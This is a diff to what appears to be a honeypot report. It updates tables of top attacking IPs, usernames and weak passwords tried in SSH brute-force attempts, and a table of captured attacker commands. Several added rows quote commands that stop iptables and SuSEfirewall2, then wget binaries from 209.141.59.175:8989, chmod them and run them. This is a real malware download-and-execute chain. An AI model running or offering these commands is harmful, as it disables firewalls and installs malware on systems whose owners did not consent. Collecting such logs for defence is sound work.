@@ -13,52 +13,59 @@ system. The table is sorted by the number of attempts.
 
 | Client IP | Count    |
 |-----------|----------|
-| 101.37.88.200 | 4920 |
-| 147.139.145.116 | 4720 |
-| 121.199.75.185 | 4502 |
-| 8.218.173.154 | 4192 |
-| 120.79.150.179 | 4098 |
-| 118.31.22.32 | 754 |
-| 134.209.155.77 | 159 |
-| 140.249.187.232 | 159 |
-| 182.92.217.25 | 159 |
-| 46.250.224.147 | 86 |
+| 120.79.198.68 | 11833 |
+| 8.134.15.69 | 4668 |
+| 149.129.249.160 | 4598 |
+| 8.218.103.79 | 4214 |
+| 47.251.41.26 | 3704 |
+| 59.110.221.129 | 3076 |
+| 118.31.22.32 | 1472 |
+| 120.78.6.26 | 1369 |
+| 209.141.59.175 | 252 |
+| 120.26.104.57 | 159 |
 
 ### Top 10 malicious try to login as
 
 | Usernames | Count    |
 |-----------|----------|
-| root | 761 |
-| user | 19 |
-| ubuntu | 18 |
-| admin | 13 |
-| ftpuser | 9 |
-| alidavari | 6 |
-| hadoop | 5 |
-| jenkins | 5 |
-| kedarc | 5 |
-| minecraft | 5 |
+| root | 651 |
+| nagios | 508 |
+| dammit | 507 |
+| cpanel | 505 |
+| service | 504 |
+| alpha | 503 |
+| cesar | 503 |
+| mailman | 503 |
+| scan | 502 |
+| anaconda | 501 |
 
 ### Top 10 malicious try to authenticate with
 
 | Password | Count    |
 |-----------|----------|
-| 123456 | 228 |
-| 123 | 19 |
-| 1234 | 16 |
-| 12345 | 15 |
-| password | 11 |
-| 111111 | 9 |
-| P@ssw0rd | 8 |
-| 12345678 | 8 |
-| qwerty | 7 |
-| root | 6 |
+| 123456 | 266 |
+| 123 | 39 |
+| 1234 | 32 |
+| P@ssw0rd | 29 |
+| test | 21 |
+| password | 21 |
+| test123 | 20 |
+| Aa123456 | 20 |
+| 12345678 | 19 |
+| password123 | 18 |
 
 ### Top malicious commands try to execute
 
 | Client | Command |
 |--------|---------|
-| 46.250.224.147 | uname -s -m |
-| 140.249.187.232 | uname -s -m |
-| 182.92.217.25 | uname -s -m |
-| 134.209.155.77 | uname -s -m |
+| 223.113.69.98 | uname -s -m |
+| 47.251.162.185 | uname -s -m |
+| 209.141.59.175 | /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://209.141.59.175:8989/Lin2.4;chmod 777 Lin2.4;./Lin2.4; |
+| 209.141.59.175 | /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://209.141.59.175:8989/Lin2.6;chmod 777 Lin2.6;./Lin2.6; |
+| 209.141.59.175 | /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://209.141.59.175:8989/lin-arm;chmod 777lin-arm;./lin-arm; |
+| 209.141.59.175 | /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://209.141.59.175:8989/lin-mips;chmod 777 lin-mips;./lin-mips; |
+| 209.141.59.175 | /etc/init.d/iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget -c http://209.141.59.175:8989/ddwrt;chmod 777 ddwrt;./ddwrt; |
+| 209.141.59.175 | chmod 777 lin-arm;./lin-arm; |
+| 209.141.59.175 | ./lin-mips |
+| 209.141.59.175 | ./ddwrt |
+| 120.26.104.57 | uname -s -m |
